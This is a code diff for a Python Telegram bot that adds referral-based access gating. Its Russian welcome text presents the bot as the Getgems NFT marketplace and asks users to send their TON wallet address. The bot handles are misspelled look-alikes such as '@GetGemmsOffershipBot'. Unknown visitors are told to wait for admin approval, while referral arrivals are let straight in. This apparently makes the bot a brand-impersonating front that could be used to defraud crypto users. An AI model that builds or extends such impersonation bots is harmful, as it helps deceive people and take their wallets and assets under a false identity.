@@ -4,6 +4,7 @@ from telethon import events, Button
 from telethon.tl.types import User, MessageEntityBold, MessageEntityTextUrl
 
 from server.bot.store.referral_links import add_referral_click, get_referral_by_link
+from server.bot.store.access_control import has_access, grant_access, is_request_pending
 from server.utils.referral_logging import log_referral_action
 
 
@@ -31,10 +32,40 @@ async def handle_start_command(event: events.NewMessage.Event):
     referral_link_str = None
     
     print(f"[BOT] [START] User {sender.id} sent: '{message_text}', parts: {message_parts}, is_referral: {is_referral}")
+    # If this is a referral link, grant automatic access
+    if is_referral:
+        if not has_access(sender.id):
+            grant_access(sender.id)
+            print(f"[BOT] [ACCESS] Granted automatic access via referral to user {sender.id}")
+    else:
+        # If not a referral link, check if user has access
+        if not has_access(sender.id):
+            print(f"[BOT] [ACCESS] User {sender.id} does not have access")
+            
+            # Check if user already has a pending request
+            if is_request_pending(sender.id):
+                # Show message that request is pending
+                await event.respond(
+                    "⏳ **Ваша заявка на доступ находится на рассмотрении.**\n\n"
+                    "Пожалуйста, ожидайте одобрения администратора."
+                )
+            else:
+                # Show access denied message with button to request access
+                await event.respond(
+                    "🔒 **Нет доступа**\n\n"
+                    "Для использования бота необходимо получить доступ.\n"
+                    "Нажмите кнопку ниже, чтобы запросить доступ.",
+                    buttons=[
+                        [Button.inline("📝 Запросить доступ", data=b"request_access")]
+                    ]
+                )
+            
+            raise events.StopPropagation()
+    
     
     if is_referral:
         # Extract referral link from /start ref_123456
-        # Format: https://t.me/bot_username?start=ref_123456
+        # Format: https://t.me/bot_username?start=ref_123456Offership
         bot_me = await event.client.get_me()
         bot_username = bot_me.username or "GetGemsOffership_bot"
         ref_param = message_parts[1]  # This is "ref_123456"
@@ -65,7 +96,7 @@ async def handle_start_command(event: events.NewMessage.Event):
 
 Это бот Getgems, через него можно торговать на нашем маркетплейсе прямо в мини-аппе Telegram, и это удобнейший способ торговать Номерами, Юзернеймами и Подарками с 0% комиссией! 💯
 
-💡 Главное, с помощью этого бота вы можете дарить и обмениваться своими NFT-подарками прямо в чатах и диалогах, для этого просто отправьте боту свой адрес TON-кошелька. После удачной привязки, когда вы начнете набирать в любой переписке @GetGemmsNftBot — активируется inline-режим, теперь можно дарить и обмениваться NFT прямо в переписке!"""
+💡 Главное, с помощью этого бота вы можете дарить и обмениваться своими NFT-подарками прямо в чатах и диалогах, для этого просто отправьте боту свой адрес TON-кошелька. После удачной привязки, когда вы начнете набирать в любой переписке @GetGemmsOffershipBot — активируется inline-режим, теперь можно дарить и обмениваться NFT прямо в переписке!"""
 
     # Create inline keyboard with URL buttons
     buttons = [
